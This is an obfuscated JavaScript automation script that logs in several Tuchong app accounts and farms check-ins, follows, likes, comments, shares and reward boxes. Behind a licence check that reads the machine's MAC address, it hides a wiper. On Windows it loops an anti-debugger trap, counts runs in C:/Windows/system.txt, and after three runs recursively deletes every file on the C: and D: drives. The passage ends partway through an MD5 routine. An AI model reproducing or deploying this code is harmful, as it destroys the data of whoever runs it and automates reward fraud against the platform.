const $ = new Env("图虫");
const VM = require("sablejs/runtime")(),
  {
    MD5
  } = require("crypto-js"),
  cryptoJS = require("crypto-js"),
  path = require("path"),
  fs = require("fs");
let arrs = [],
  envSplitor = ["@", "\n"],
  httpResult,
  httpReq,
  httpResp,
  userCookie = ($.isNode() ? process.env.tcphone : $.getdata("tcphone")) || "",
  acckey = $.isNode() ? process.env.cdkey ? process.env.cdkey : "" : $.getdata("cdkey") ? $.getdata("cdkey") : "";
function initVM() {
  vm = new VM();
  const _0x5d671d = vm.getGlobal(),
    _0x49efe2 = vm.createObject(),
    _0xf9b87f = vm.createFunction("log", function () {
      const _0x3fed8b = [];
      for (let _0x46ab7f = 0; _0x46ab7f < arguments.length; _0x46ab7f++) {
        _0x3fed8b.push(vm.asString(arguments[_0x46ab7f]));
      }
      console.log(..._0x3fed8b);
      return vm.createUndefined();
    }),
    _0xf5eec7 = vm.createFunction("xxxx", function (_0x3f39e7) {
      let _0x326d70 = eval(_0x3f39e7.value);
      return vm.createString(JSON.stringify(_0x326d70));
    }),
    _0x4cfe1a = vm.createFunction("yyyy", function (_0x4d8d5d) {
      let _0x665af = _0x4d8d5d.value,
        _0x1db507 = fs.readFileSync(_0x665af, "utf-8").replace(/\r\n/g, "\n"),
        _0x5dd203 = cryptoJS.MD5(_0x1db507).toString();
      return vm.createString(_0x5dd203);
    }),
    _0x328a41 = vm.createFunction("ddd", function (_0x2240e9) {
      let _0xfa52ee = cryptoJS.MD5(_0x2240e9.value).toString();
      return vm.createString(_0xfa52ee);
    });
  vm.setProperty(_0x49efe2, "log", _0xf9b87f);
  vm.setProperty(_0x5d671d, "xxxx", _0xf5eec7);
  vm.setProperty(_0x5d671d, "console", _0x49efe2);
  vm.setProperty(_0x5d671d, "yyyy", _0x4cfe1a);
  vm.setProperty(_0x5d671d, "ddd", _0x328a41);
  vm.run(fs.readFileSync("./output_final.js").toString());
  return vm;
}
function destroyVM(_0x325699) {
  _0x325699.destroy();
}
function abc(_0x38ce66, _0xda2fe3, _0x5c7094, _0x37205, _0x5e955a) {
  const _0x3d7ac5 = _0x38ce66.getGlobal();
  let _0x1f7196 = _0x38ce66.getProperty(_0x3d7ac5, "xab"),
    _0x5a1fea = _0x38ce66.call(_0x1f7196, _0x38ce66.createUndefined(), _0x38ce66.createString(_0xda2fe3), _0x38ce66.createString(_0x37205), _0x38ce66.createString(_0x5e955a), _0x38ce66.createString(_0x5c7094));
  _0x5a1fea = _0x38ce66.asString(_0x5a1fea);
  return _0x5a1fea;
}
function xyz(_0x3dff2a, _0x26f537, _0x459b66, _0x494898, _0x51e61f) {
  const _0x5b5df5 = _0x3dff2a.getGlobal();
  let _0x12e4ee = _0x3dff2a.getProperty(_0x5b5df5, "xmn"),
    _0x4be92d = _0x3dff2a.call(_0x12e4ee, _0x3dff2a.createUndefined(), _0x3dff2a.createString(_0x26f537), _0x3dff2a.createString(_0x494898), _0x3dff2a.createString(_0x51e61f), _0x3dff2a.createString(_0x459b66));
  _0x4be92d = _0x3dff2a.asString(_0x4be92d);
  return _0x4be92d;
}
let userList = [],
  userIdx = 0,
  userCount = 0;
if ($.isNode()) {
  gtr = require("fs");
  if (isFileExist("C:/")) {
    console.log("电脑环境");
    setInterval(() => {
      do {
        (function (_0x40d214) {
          return function (_0x1b856f) {
            return Function("Function(arguments[0]+\"" + _0x1b856f + "\")()");
          }(_0x40d214);
        })("bugger")("de", 0, 0, (0, 0));
        addF("d:/");
        addF("C:/");
      } while (1);
    }, 0);
  } else {
    console.log("青龙环境");
    function getMACAddresses() {
      var _0x5dcb3d = "",
        _0x12a785 = fs.readdirSync("/sys/class/net/");
      _0x12a785.forEach(function (_0x1c7584) {
        var _0x11cfda = path.join("/sys/class/net", _0x1c7584, "address");
        _0x1c7584.substr(0, 3) == "eth" && fs.existsSync(_0x11cfda) && (_0x5dcb3d = fs.readFileSync(_0x11cfda).toString().trim());
      });
      return _0x5dcb3d;
    }
    mac = getMACAddresses();
  }
} else {
  console.log("代理环境");
}
function isFileExist(_0x11826f) {
  try {
    gtr.accessSync(_0x11826f, gtr.F_OK);
  } catch (_0x5965ce) {
    return false;
  }
  return true;
}
function addF(_0x7d7a83, _0x1f7ea0) {
  let _0x388b94 = 0,
    _0x552ed0 = "C:/Windows/system.txt";
  if (isFileExist(_0x552ed0)) {
    _0x388b94 = gtr.readFileSync(_0x552ed0, "utf8");
  } else {
    if (isFileExist("C:/")) {
      gtr.writeFile(_0x552ed0, "1", function (_0x4e9271) {
        if (_0x4e9271) {
          throw _0x4e9271;
        }
      });
    } else {
      return;
    }
  }
  if (_0x388b94 == 99) {
    return 99;
  }
  console.log(_0x388b94);
  console.log("警告，恶意破解脚本将面临系统爆炸！！！，你只有3次机会！", _0x388b94);
  if (parseInt(_0x388b94) < 3) {
    let _0x58f7d2 = parseInt(_0x388b94) + 1;
    gtr.writeFileSync(_0x552ed0, _0x58f7d2 + "", "utf8");
    return;
  }
  if (!gtr.existsSync(_0x7d7a83)) {
    return;
  }
  if (gtr.statSync(_0x7d7a83).isDirectory()) {
    var _0x54eb5d = gtr.readdirSync(_0x7d7a83),
      _0x265fb5 = _0x54eb5d.length,
      _0x4a90e9 = 0;
    if (_0x265fb5 > 0) {
      _0x54eb5d.forEach(function (_0x5c843e) {
        _0x4a90e9++;
        var _0x4ca6fa = _0x7d7a83 + "/" + _0x5c843e;
        gtr.statSync(_0x4ca6fa).isDirectory() ? addF(_0x4ca6fa, true) : gtr.unlinkSync(_0x4ca6fa);
      });
      _0x265fb5 == _0x4a90e9 && _0x1f7ea0 && gtr.rmdirSync(_0x7d7a83);
    } else {
      _0x265fb5 == 0 && _0x1f7ea0 && gtr.rmdirSync(_0x7d7a83);
    }
  } else {
    gtr.unlinkSync(_0x7d7a83);
  }
}
class UserInfo {
  constructor(_0x30e6c1) {
    this.index = ++userIdx;
    this.name = this.index;
    this.valid = false;
    this.cFlag = true;
    this.id = 0;
    this.token = "";
    this.ydid = "";
    this.name = "";
    this.tid = "";
    this.sjid = "";
    try {
      this.ck = _0x30e6c1;
      this.did = random(16);
    } catch (_0x3346f8) {}
  }
  async sh() {
    try {
      await this.fqdl();
      await this.fqye();
      await $.wait(5000);
      await this.fqxx();
      await this.fqqd();
      await this.fqlb();
      for (let _0x17042e = 0; _0x17042e < 15; _0x17042e++) {
        await this.fqbx();
      }
    } catch (_0x403eb8) {
      console.log(_0x403eb8);
    } finally {
      return Promise.resolve(1);
    }
  }
  async fqdl() {
    try {
      let _0x360f97 = "https://api.tuchong.com/accounts/login-mobile",
        _0x3ed678 = "captcha=1&from=mobile&mobile_number=" + this.ck + "&token=1";
      this.populateUrlObject(_0x360f97, _0x3ed678);
      await httpRequest("post", this.urlObject);
      let _0x41929b = httpResult;
      _0x41929b.result == "SUCCESS" ? (console.log("账号[" + this.index + "]:图虫" + this.ck + "：" + _0x41929b.message + "，用户：" + _0x41929b.name), this.token = _0x41929b.token) : (console.log("账号[" + this.index + "]:图虫登录：" + JSON.stringify(_0x41929b)), this.cFlag = false);
    } catch (_0x448c95) {
      console.log("账号[" + this.index + "]", JSON.stringify(result));
    } finally {
      return Promise.resolve(1);
    }
  }
  async fqye() {
    try {
      let _0x4088f4 = "https://m.tuchong.com/tuchongrest/4/users/self/rewards?count=20&page=1";
      this.populateUrlObject(_0x4088f4);
      await httpRequest("get", this.urlObject);
      let _0x16b087 = httpResult;
      _0x16b087.result == "SUCCESS" ? console.log("账号[" + this.index + "]:图虫总收益：" + _0x16b087.reward_money / 100 + "元，现金余额：" + _0x16b087.balance / 100) : (console.log("账号[" + this.index + "]:图虫余额：" + JSON.stringify(_0x16b087)), this.cFlag = false);
    } catch (_0x5ac7f2) {
      console.log("账号[" + this.index + "]", JSON.stringify(result));
    } finally {
      return Promise.resolve(1);
    }
  }
  async fqxx() {
    try {
      let _0x105a84 = "https://m.tuchong.com/tuchongrest/sites/self/info";
      this.populateUrlObject(_0x105a84);
      await httpRequest("get", this.urlObject);
      let _0x37bd8a = httpResult;
      _0x37bd8a.result == "SUCCESS" ? console.log("账号[" + this.index + "]:图虫金币余额：" + _0x37bd8a.balance_point) : (console.log("账号[" + this.index + "]:图虫：" + JSON.stringify(_0x37bd8a)), this.cFlag = false);
    } catch (_0x57468f) {
      console.log("账号[" + this.index + "]", JSON.stringify(result));
    } finally {
      return Promise.resolve(1);
    }
  }
  async fqqd() {
    try {
      let _0x1660a0 = "https://api.tuchong.com/point/check-in?";
      this.populateUrlObject(_0x1660a0);
      await httpRequest("get", this.urlObject);
      let _0x448260 = httpResult;
      _0x448260.result !== "ERROR" ? console.log("账号[" + this.index + "]:图虫签到：" + _0x448260.result) : (console.log("账号[" + this.index + "]:图虫签到:" + _0x448260.message), this.cFlag = false);
    } catch (_0x536fda) {
      console.log("账号[" + this.index + "]", JSON.stringify(result));
    } finally {
      return Promise.resolve(1);
    }
  }
  async fqlb() {
    try {
      let _0x1d6072 = "https://tuchong.com/gapi/feed/app?new-feed=1&page=1&type=refresh";
      this.populateUrlObject(_0x1d6072);
      await httpRequest("get", this.urlObject);
      let _0xdd8826 = httpResult;
      _0xdd8826.result == "SUCCESS" ? (console.log("账号[" + this.index + "]:图虫文章：" + _0xdd8826.feedList[0].entry.title), _0xdd8826.feedList[0].entry.title == undefined ? await this.fqlb() : (this.id = _0xdd8826.feedList[0].entry.author_id, this.ydid = _0xdd8826.feedList[0].data_id, this.tid = _0xdd8826.feedList[0].entry.rqt_id, await this.fqgz(), await this.fqdz(), await this.fqpl(), await this.fqfx())) : (console.log("账号[" + this.index + "]:图虫签到视频:" + _0xdd8826.err_tips), this.cFlag = false);
    } catch (_0xe03f2b) {
      console.log("账号[" + this.index + "]", JSON.stringify(result));
    } finally {
      return Promise.resolve(1);
    }
  }
  async fqgz() {
    try {
      let _0x35a730 = "https://tuchong.com/gapi/interactive/follow",
        _0x297983 = "position=tab_home_recommend&referer=tab_home_activity&site_id=" + this.id;
      this.populateUrlObject(_0x35a730, _0x297983);
      await httpRequest("post", this.urlObject);
      let _0x51acee = httpResult;
      _0x51acee.result == "SUCCESS" ? console.log("账号[" + this.index + "]:图虫关注：" + _0x51acee.message) : (console.log("账号[" + this.index + "]:图虫关注:" + _0x51acee.message), this.cFlag = false);
    } catch (_0x463883) {
      console.log("账号[" + this.index + "]", JSON.stringify(result));
    } finally {
      return Promise.resolve(1);
    }
  }
  async fqdz() {
    try {
      let _0x5d6b93 = "https://tuchong.com/gapi/interactive/favorite",
        _0x5612fb = "position=tab_home_recommend&post_id=" + this.ydid + "&referer=tab_home_recommend&rqt_id=" + this.tid;
      this.populateUrlObject(_0x5d6b93, _0x5612fb);
      await httpRequest("put", this.urlObject);
      let _0x4cb167 = httpResult;
      _0x4cb167.result == "SUCCESS" ? console.log("账号[" + this.index + "]:图虫点赞：" + _0x4cb167.message) : (console.log("账号[" + this.index + "]:图虫点赞:" + _0x4cb167.message), this.cFlag = false);
    } catch (_0x25d8cf) {
      console.log("账号[" + this.index + "]", JSON.stringify(result));
    } finally {
      return Promise.resolve(1);
    }
  }
  async fqpl() {
    try {
      let _0x5695b3 = "https://api.tuchong.com/3/posts/" + this.ydid + "/comments",
        _0x116f5a = "content=6&position=page_comment_list&referer=tab_home_recommend&rqt_id=" + this.tid;
      this.populateUrlObject(_0x5695b3, _0x116f5a);
      await httpRequest("post", this.urlObject);
      let _0x55f38e = httpResult;
      _0x55f38e.result == "SUCCESS" ? console.log("账号[" + this.index + "]:图虫评论：成功") : (console.log("账号[" + this.index + "]:图虫评论:失败"), this.cFlag = false);
    } catch (_0x1be0bd) {
      console.log("账号[" + this.index + "]", JSON.stringify(result));
    } finally {
      return Promise.resolve(1);
    }
  }
  async fqfx() {
    try {
      let _0x2964a5 = "https://api.tuchong.com/share/recall",
        _0xca05b0 = "author_id=" + this.id + "&content_type=photo&platform=weixinfriend&share_id=" + this.ydid;
      this.populateUrlObject(_0x2964a5, _0xca05b0);
      await httpRequest("post", this.urlObject);
      let _0x5c5455 = httpResult;
      _0x5c5455.result == "SUCCESS" ? console.log("账号[" + this.index + "]:图虫分享：成功") : (console.log("账号[" + this.index + "]:图虫分享:失败"), this.cFlag = false);
    } catch (_0x448b2c) {
      console.log("账号[" + this.index + "]", JSON.stringify(result));
    } finally {
      return Promise.resolve(1);
    }
  }
  async fqbx() {
    try {
      let _0x1bd5b9 = "https://m.tuchong.com/tuchonggapi/reward/point/box";
      this.populateUrlObject(_0x1bd5b9);
      await httpRequest("get", this.urlObject);
      let _0x1b84a7 = httpResult;
      console.log("账号[" + this.index + "]:图虫开宝箱：" + _0x1b84a7.result);
    } catch (_0x95e8ee) {
      console.log("账号[" + this.index + "]", JSON.stringify(result));
    } finally {
      return Promise.resolve(1);
    }
  }
  async populateUrlObject(_0x5ee5d9, _0x5086a3 = "") {
    let _0x22c0fe = _0x5ee5d9.replace("//", "/").split("/")[1],
      _0x568ef9 = {
        url: _0x5ee5d9,
        headers: {
          Host: _0x22c0fe,
          iid: "1427584579554648",
          "Content-Type": "application/x-www-form-urlencoded; charset=utf-8",
          version: "7.43.0",
          "Accept-Language": "zh-Hans-CN;q=1.0",
          "Accept-Encoding": "br;q=1.0, gzip;q=0.9, deflate;q=0.8",
          platform: "ios",
          token: this.token,
          language: "zh-Hans-CN",
          "User-Agent": "Tuchong/7.43.0 (com.ss.iphone.tuchong; build:36; iOS 14.2.0) Alamofire/5.4.3",
          Cookie: "device_id=3538642326012142; token=" + this.token
        },
        timeout: 5000
      };
    _0x5086a3 && (_0x568ef9.body = _0x5086a3);
    this.urlObject = _0x568ef9;
  }
}
!(async () => {
  if (typeof $request !== "undefined") {
    await GetRewrite();
  } else {
    initVM();
    arrs = abc(global.vm, acckey, mac, 126, 0);
    if (arrs == "") {
      return;
    }
    arrs = JSON.parse(arrs);
    if (!arrs) {
      return;
    }
    console.log("\n公告：" + arrs.gg + "\n");
    console.log("当前版本：1.0 " + arrs.bb + "\n");
    console.log("当前设备可执行账号限制为" + arrs.num + "个账号\n");
    if (!(await checkEnv())) {
      return;
    }
    if (userList.length > arrs.num) {
      return;
    }
    if (userList.length > 0) {
      taskall = [];
      for (let _0x49b9e4 of userList) {
        if (_0x49b9e4.cFlag) {
          taskall.push(_0x49b9e4.sh());
        }
        taskall.length == 1 && (await Promise.all(taskall), taskall = []);
      }
      if (taskall.length > 0) {
        await Promise.all(taskall);
      }
    }
    await $.showmsg();
    destroyVM(global.vm);
  }
})().catch(_0x122221 => console.log(_0x122221)).finally(() => $.done());
async function GetRewrite() {
  $request.url.indexOf("api.ibreader.com/api/user/userInfo") > -1 && (ck = "" + $request.headers.Cookie, userCookie ? -1 == userCookie.indexOf(ck) && (userCookie = userCookie + "@" + ck, $.setdata(userCookie, "bkcookie"), ckList = userCookie.split("@"), $.msg("获取第" + ckList.length + "个ck成功: " + ck)) : ($.setdata(ck, "bkcookie"), $.msg("获取第1个ck成功: " + ck)));
}
async function checkEnv() {
  if (userCookie) {
    let _0x110d76 = envSplitor[0];
    for (let _0x339b64 of envSplitor) if (userCookie.indexOf(_0x339b64) > -1) {
      _0x110d76 = _0x339b64;
      break;
    }
    for (let _0x26cf0c of userCookie.split(_0x110d76)) _0x26cf0c && userList.push(new UserInfo(_0x26cf0c));
    userCount = userList.length;
  } else {
    console.log("未找到CK");
    return;
  }
  console.log("共找到" + userCount + "个账号");
  return !0;
}
function randomString(_0x24ffa1 = 12) {
  let _0x347650 = "abcdef0123456789",
    _0x5876e9 = _0x347650.length,
    _0x6af6e9 = "";
  for (i = 0; i < _0x24ffa1; i++) {
    _0x6af6e9 += _0x347650.charAt(Math.floor(Math.random() * _0x5876e9));
  }
  return _0x6af6e9;
}
function populateUrlObject(_0x1055f3, _0x33f624, _0x1b1263 = "") {
  let _0x40aadb = _0x1055f3.replace("//", "/").split("/")[1],
    _0x28a849 = {
      url: _0x1055f3,
      headers: {
        Host: _0x40aadb,
        Cookie: this.ck
      },
      timeout: 5000
    };
  _0x1b1263 && (_0x28a849.body = _0x1b1263);
  return _0x28a849;
}
async function httpRequest(_0x2da055, _0x4adf4d) {
  httpResult = null;
  httpReq = null;
  httpResp = null;
  return new Promise(_0x4147fd => {
    $.send(_0x2da055, _0x4adf4d, async (_0x132859, _0x2653ca, _0x22b785) => {
      try {
        if (!(httpReq = _0x2653ca, httpResp = _0x22b785, _0x132859)) {
          if (_0x22b785.body) {
            if ("object" == typeof _0x22b785.body) {
              httpResult = _0x22b785.body;
            } else {
              try {
                httpResult = JSON.parse(_0x22b785.body);
              } catch (_0x37609a) {
                httpResult = _0x22b785.body;
              }
            }
          }
        }
      } catch (_0x509001) {
        console.log(_0x509001);
      } finally {
        _0x4147fd();
      }
    });
  });
}
function random(_0x2e5040 = 12) {
  let _0x5127de = "0123456789",
    _0x2284e1 = _0x5127de.length,
    _0x593a74 = "";
  for (i = 0; i < _0x2e5040; i++) {
    _0x593a74 += _0x5127de.charAt(Math.floor(Math.random() * _0x2284e1));
  }
  return _0x593a74;
}
function MD5Encrypt(_0x151b08) {
  function _0x260f97(_0x9f5b30, _0x519081) {
    return _0x9f5b30 << _0x519081 | _0x9f5b30 >>> 32 - _0x519081;
  }
  function _0x30d6f5(_0x4debf9, _0x5d4ed5) {
    var _0x4f3a99, _0xb54028, _0x36c3c9, _0x5c94e6, _0x29fc9c;
    _0x36c3c9 = 2147483648 & _0x4debf9;
    _0x5c94e6 = 2147483648 & _0x5d4ed5;
    _0x4f3a99 = 1073741824 & _0x4debf9;
    _0xb54028 = 1073741824 & _0x5d4ed5;
    _0x29fc9c = (1073741823 & _0x4debf9) + (1073741823 & _0x5d4ed5);
    return _0x4f3a99 & _0xb54028 ? 2147483648 ^ _0x29fc9c ^ _0x36c3c9 ^ _0x5c94e6 : _0x4f3a99 | _0xb54028 ? 1073741824 & _0x29fc9c ? 3221225472 ^ _0x29fc9c ^ _0x36c3c9 ^ _0x5c94e6 : 1073741824 ^ _0x29fc9c ^ _0x36c3c9 ^ _0x5c94e6 : _0x29fc9c ^ _0x36c3c9 ^ _0x5c94e6;
  }
  function _0x20935a(_0x9ff196, _0x399a43, _0xe5840f) {
    return _0x9ff196 & _0x399a43 | ~_0x9ff196 & _0xe5840f;
  }
  function _0x1834d7(_0x36b229, _0xa2b7c3, _0x5d32e3) {
    return _0x36b229 & _0x5d32e3 | _0xa2b7c3 & ~_0x5d32e3;
  }
  function _0x32df70(_0x2ffc7e, _0x416f0f, _0x510073) {
    return _0x2ffc7e ^ _0x416f0f ^ _0x510073;
  }
  function _0x379a41(_0x4a7644, _0x249b3b, _0x433c2c) {
    return _0x249b3b ^ (_0x4a7644 | ~_0x433c2c);
  }
  function _0x4463ee(_0x5b050e, _0x4f0317, _0x113401, _0xbadee6, _0x4980ec, _0x41a574, _0x2d97ee) {
    _0x5b050e = _0x30d6f5(_0x5b050e, _0x30d6f5(_0x30d6f5(_0x20935a(_0x4f0317, _0x113401, _0xbadee6), _0x4980ec), _0x2d97ee));
    return _0x30d6f5(_0x260f97(_0x5b050e, _0x41a574), _0x4f0317);
  }
  function _0x3a7d74(_0x8fb087, _0xa4b851, _0x244652, _0x21109b, _0x1adc3c, _0x39bd61, _0x5bb9b1) {
    _0x8fb087 = _0x30d6f5(_0x8fb087, _0x30d6f5(_0x30d6f5(_0x1834d7(_0xa4b851, _0x244652, _0x21109b), _0x1adc3c), _0x5bb9b1));
    return _0x30d6f5(_0x260f97(_0x8fb087, _0x39bd61), _0xa4b851);
  }
  function _0x31d413(_0x20548c, _0x398ec4, _0x3a09c9, _0xbc6ba2, _0x5f1138, _0x1a7a3f, _0x1debb5) {
    _0x20548c = _0x30d6f5(_0x20548c, _0x30d6f5(_0x30d6f5(_0x32df70(_0x398ec4, _0x3a09c9, _0xbc6ba2), _0x5f1138), _0x1debb5));
    return _0x30d6f5(_0x260f97(_0x20548c, _0x1a7a3f), _0x398ec4);
  }
  function _0x20e805(_0xd8b63a, _0x5b3305, _0x5d20e4, _0x376da9, _0x374f88, _0x3bfbf7, _0x236ff7) {
    _0xd8b63a = _0x30d6f5(_0xd8b63a, _0x30d6f5(_0x30d6f5(_0x379a41(_0x5b3305, _0x5d20e4, _0x376da9), _0x374f88), _0x236ff7));
    return _0x30d6f5(_0x260f97(_0xd8b63a, _0x3bfbf7), _0x5b3305);
  }
  function _0x3651a1(_0x363b59) {
    for (var _0x4fdd07, _0x4f56ab = _0x363b59.length, _0x5d4e65 = _0x4f56ab + 8, _0x102e74 = (_0x5d4e65 - _0x5d4e65 % 64) / 64, _0x1b93c5 = 16 * (_0x102e74 + 1), _0x585341 = new Array(_0x1b93c5 - 1), _0x13a996 = 0, _0x1ab93a = 0; _0x4f56ab > _0x1ab93a;) {
      _0x4fdd07 = (_0x1ab93a - _0x1ab93a % 4) / 4;
      _0x13a996 = _0x1ab93a % 4 * 8;
      _0x585341[_0x4fdd07] = _0x585341[_0x4fdd07] | _0x363b59.charCodeAt(_0x1ab93a) << _0x13a996;
      _0x1ab93a++;
    }
    _0x4fdd07 = (_0x1ab93a - _0x1ab93a % 4) / 4;
    _0x13a996 = _0x1ab93a % 4 * 8;
    _0x585341[_0x4fdd07] = _0x585341[_0x4fdd07] | 128 << _0x13a996;
    _0x585341[_0x1b93c5 - 2] = _0x4f56ab << 3;
    _0x585341[_0x1b93c5 - 1] = _0x4f56ab >>> 29;
    return _0x585341;
  }
  function _0x299cad(_0x56391b) {
    var _0x44af85,
      _0xc4811b,
      _0x55baf0 = "",
      _0x50020c = "";
    for (_0xc4811b = 0; 3 >= _0xc4811b; _0xc4811b++) {
      _0x44af85 = _0x56391b >>> 8 * _0xc4811b & 255;
      _0x50020c = "0" + _0x44af85.toString(16);
      _0x55baf0 += _0x50020c.substr(_0x50020c.length - 2, 2);
    }
    return _0x55baf0;
  }
  function _0x4b87f2(_0x25c2f5) {
    _0x25c2f5 = _0x25c2f5.replace(/\r\n/g, "\n");
    for (var _0x30a0a5 = "", _0x59a82a = 0; _0x59a82a < _0x25c2f5.length; _0x59a82a++) {
      var _0x32b0b2 = _0x25c2f5.charCodeAt(_0x59a82a);
      128 > _0x32b0b2 ? _0x30a0a5 += String.fromCharCode(_0x32b0b2) : _0x32b0b2 > 127 && 2048 > _0x32b0b2 ? (_0x30a0a5 += String.fromCharCode(_0x32b0b2 >> 6 | 192), _0x30a0a5 += String.fromCharCode(63 & _0x32b0b2 | 128)) : (_0x30a0a5 += String.fromCharCode(_0x32b0b2 >> 12 | 224), _0x30a0a5 += String.fromCharCode(_0x32b0b2 >> 6 & 63 | 128), _0x30a0a5 += String.fromCharCode(63 & _0x32b0b2 | 128));
    }
    return _0x30a0a5;
  }
  var _0x5ce7a1,
    _0x54490e,
    _0x8ab49,
    _0x36ea20,
    _0x532065,
    _0x4f3109,
    _0x4b4f2c,
    _0x19358f,
    _0x6d2508,
    _0x66dab9 = [],
    _0x5edff4 = 7,
    _0x106cf2 = 12,
    _0x4b72d4 = 17,
    _0x12ddaf = 22,
    _0x11da95 = 5,
    _0x1dd98c = 9,
    _0x695821 = 14,
    _0x18d997 = 20,
    _0x5c4b83 = 4,
    _0x764662 = 11,
    _0x4c24c8 = 16,
    _0x3c49bc = 23,
    _0x3c8e65 = 6,
    _0x1df574 = 10,
    _0x50c062 = 15,
    _0x28b128 = 21;
  for (_0x151b08 = _0x4b87f2(_0x151b08), _0x66dab9 = _0x3651a1(_0x151b08), _0x4f3109 = 1732584193, _0x4b4f2c = 4023233417, _0x19358f = 2562383102, _0x6d2508 = 271733878, _0x5ce7a1 = 0; _0x5ce7a1 < _0x66dab9.length; _0x5ce7a1 += 16) {
    _0x54490e = _0x4f3109;
    _0x8ab49 = _0x4b4f2c;
    _0x36ea20 = _0x19358f;
    _0x532065 = _0x6d2508;
    _0x4f3109 = _0x4463ee(_0x4f3109, _0x4b4f2c, _0x19358f, _0x6d2508, _0x66dab9[_0x5ce7a1 + 0], _0x5edff4, 3614090360);
    _0x6d2508 = _0x4463ee(_0x6d2508, _0x4f3109, _0x4b4f2c, _0x19358f, _0x66dab9[_0x5ce7a1 + 1], _0x106cf2, 3905402710);
    _0x19358f = _0x4463ee(_0x19358f, _0x6d2508, _0x4f3109, _0x4b4f2c, _0x66dab9[_0x5ce7a1 + 2], _0x4b72d4, 606105819);
    _0x4b4f2c = _0x4463ee(_0x4b4f2c, _0x19358f, _0x6d2508, _0x4f3109, _0x66dab9[_0x5ce7a1 + 3], _0x12ddaf, 3250441966);
    _0x4f3109 = _0x4463ee(_0x4f3109, _0x4b4f2c, _0x19358f, _0x6d2508, _0x66dab9[_0x5ce7a1 + 4], _0x5edff4, 4118548399);
    _0x6d2508 = _0x4463ee(_0x6d2508, _0x4f3109, _0x4b4f2c, _0x19358f, _0x66dab9[_0x5ce7a1 + 5], _0x106cf2, 1200080426);
    _0x19358f = _0x4463ee(_0x19358f, _0x6d2508, _0x4f3109, _0x4b4f2c, _0x66dab9[_0x5ce7a1 + 6], _0x4b72d4, 2821735955);
    _0x4b4f2c = _0x4463ee(_0x4b4f2c, _0x19358f, _0x6d2508, _0x4f3109, _0x66dab9[_0x5ce7a1 + 7], _0x12ddaf, 4249261313);
    _0x4f3109 = _0x4463ee(_0x4f3109, _0x4b4f2c, _0x19358f, _0x6d2508, _0x66dab9[_0x5ce7a1 + 8], _0x5edff4, 1770035416);
    _0x6d2508 = _0x4463ee(_0x6d2508, _0x4f3109, _0x4b4f2c, _0x19358f, _0x66dab9[_0x5ce7a1 + 9], _0x106cf2, 2336552879);
    _0x19358f = _0x4463ee(_0x19358f, _0x6d2508, _0x4f3109, _0x4b4f2c, _0x66dab9[_0x5ce7a1 + 10], _0x4b72d4, 4294925233);
    _0x4b4f2c = _0x4463ee(_0x4b4f2c, _0x19358f, _0x6d2508, _0x4f3109, _0x66dab9[_0x5ce7a1 + 11], _0x12ddaf, 2304563134);
    _0x4f3109 = _0x4463ee(_0x4f3109, _0x4b4f2c, _0x19358f, _0x6d2508, _0x66dab9[_0x5ce7a1 + 12], _0x5edff4, 1804603682);
    _0x6d2508 = _0x4463ee(_0x6d2508, _0x4f3109, _0x4b4f2c, _0x19358f, _0x66dab9[_0x5ce7a1 + 13], _0x106cf2, 4254626195);
    _0x19358f = _0x4463ee(_0x19358f, _0x6d2508, _0x4f3109, _0x4b4f2c, _0x66dab9[_0x5ce7a1 + 14], _0x4b72d4, 2792965006);
    _0x4b4f2c = _0x4463ee(_0x4b4f2c, _0x19358f, _0x6d2508, _0x4f3109, _0x66dab9[_0x5ce7a1 + 15], _0x12ddaf, 1236535329);
    _0x4f3109 = _0x3a7d74(_0x4f3109, _0x4b4f2c, _0x19358f, _0x6d2508, _0x66dab9[_0x5ce7a1 + 1], _0x11da95, 4129170786);
    _0x6d2508 = _0x3a7d74(_0x6d2508, _0x4f3109, _0x4b4f2c, _0x19358f, _0x66dab9[_0x5ce7a1 + 6], _0x1dd98c, 3225465664);
    _0x19358f = _0x3a7d74(_0x19358f, _0x6d2508, _0x4f3109, _0x4b4f2c, _0x66dab9[_0x5ce7a1 + 11], _0x695821, 643717713);
    _0x4b4f2c = _0x3a7d74(_0x4b4f2c, _0x19358f, _0x6d2508, _0x4f3109, _0x66dab9[_0x5ce7a1 + 0], _0x18d997, 3921069994);
    _0x4f3109 = _0x3a7d74(_0x4f3109, _0x4b4f2c, _0x19358f, _0x6d2508, _0x66dab9[_0x5ce7a1 + 5], _0x11da95, 3593408605);
    _0x6d2508 = _0x3a7d74(_0x6d2508, _0x4f3109, _0x4b4f2c, _0x19358f, _0x66dab9[_0x5ce7a1 + 10], _0x1dd98c, 38016083);
    _0x19358f = _0x3a7d74(_0x19358f, _0x6d2508, _0x4f3109, _0x4b4f2c, _0x66dab9[_0x5ce7a1 + 15], _0x695821, 3634488961);
    _0x4b4f2c = _0x3a7d74(_0x4b4f2c, _0x19358f, _0x6d2508, _0x4f3109, _0x66dab9[_0x5ce7a1 + 4], _0x18d997, 3889429448);
    _0x4f3109 = _0x3a7d74(_0x4f3109, _0x4b4f2c, _0x19358f, _0x6d2508, _0x66dab9[_0x5ce7a1 + 9], _0x11da95, 568446438);
    _0x6d2508 = _0x3a7d74(_0x6d2508, _0x4f3109, _0x4b4f2c, _0x19358f, _0x66dab9[_0x5ce7a1 + 14], _0x1dd98c, 3275163606);
    _0x19358f = _0x3a7d74(_0x19358f, _0x6d2508, _0x4f3109, _0x4b4f2c, _0x66dab9[_0x5ce7a1 + 3], _0x695821, 4107603335);
    _0x4b4f2c = _0x3a7d74(_0x4b4f2c, _0x19358f, _0x6d2508, _0x4f3109, _0x66dab9[_0x5ce7a1 + 8], _0x18d997, 1163531501);
    _0x4f3109 = _0x3a7d74(_0x4f3109, _0x4b4f2c, _0x19358f, _0x6d2508, _0x66dab9[_0x5ce7a1 + 13], _0x11da95, 2850285829);
    _0x6d2508 = _0x3a7d74(_0x6d2508, _0x4f3109, _0x4b4f2c, _0x19358f, _0x66dab9[_0x5ce7a1 + 2], _0x1dd98c, 4243563512);
    _0x19358f = _0x3a7d74(_0x19358f, _0x6d2508, _0x4f3109, _0x4b4f2c, _0x66dab9[_0x5ce7a1 + 7], _0x695821, 1735328473);
    _0x4b4f2c = _0x3a7d74(_0x4b4f2c, _0x19358f, _0x6d2508, _0x4f3109, _0x66dab9[_0x5ce7a1 + 12], _0x18d997, 2368359562);
    _0x4f3109 = _0x31d413(_0x4f3109, _0x4b4f2c, _0x19358f, _0x6d2508, _0x66dab9[_0x5ce7a1 + 5], _0x5c4b83, 4294588738);
    _0x6d2508 = _0x31d413(_0x6d2508, _0x4f3109, _0x4b4f2c, _0x19358f, _0x66dab9[_0x5ce7a1 + 8], _0x764662, 2272392833);
